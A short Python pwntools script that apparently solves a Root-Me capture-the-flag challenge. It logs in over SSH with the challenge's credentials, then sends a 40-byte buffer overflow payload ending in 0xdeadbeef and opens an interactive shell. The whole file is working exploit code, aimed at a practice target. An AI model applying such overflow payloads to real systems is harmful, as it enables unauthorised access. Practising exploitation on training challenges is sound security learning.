#!/usr/bin/env python3
from pwn import *
conn = ssh(host="challenge02.root-me.org", port=2222, user="app-systeme-ch13", password="app-systeme-ch13")
proc = conn.run(["./ch13", "./ch13"])
proc.sendline(b"a"* 40 + p32(0xdeadbeef))
proc.interactive()
